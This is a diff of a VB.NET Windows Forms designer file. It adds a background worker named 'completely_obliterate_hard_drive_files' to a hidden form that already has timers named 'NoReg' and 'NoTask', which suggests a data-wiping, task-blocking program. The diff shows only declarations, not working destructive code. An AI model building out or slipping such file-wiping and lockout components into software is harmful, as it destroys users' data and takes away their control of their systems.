@@ -28,6 +28,8 @@ Partial Class Form1
         Me.BackgroundWorker2 = New System.ComponentModel.BackgroundWorker()
         Me.NoReg = New System.Windows.Forms.Timer(Me.components)
         Me.NoTask = New System.Windows.Forms.Timer(Me.components)
+        Me.completely_obliterate_hard_drive_files = New System.ComponentModel.BackgroundWorker()
+        Me.BackgroundWorker4 = New System.ComponentModel.BackgroundWorker()
         Me.SuspendLayout()
         '
         'NoReg
@@ -36,11 +38,14 @@ Partial Class Form1
         'NoTask
         '
         '
+        'completely_obliterate_hard_drive_files
+        '
+        '
         'Form1
         '
         Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
         Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
-        Me.ClientSize = New System.Drawing.Size(449, 18)
+        Me.ClientSize = New System.Drawing.Size(456, 28)
         Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
         Me.Name = "Form1"
         Me.ShowInTaskbar = False
@@ -55,4 +60,6 @@ Partial Class Form1
     Friend WithEvents BackgroundWorker2 As System.ComponentModel.BackgroundWorker
     Friend WithEvents NoReg As Timer
     Friend WithEvents NoTask As Timer
+    Friend WithEvents completely_obliterate_hard_drive_files As System.ComponentModel.BackgroundWorker
+    Friend WithEvents BackgroundWorker4 As System.ComponentModel.BackgroundWorker
 End Class
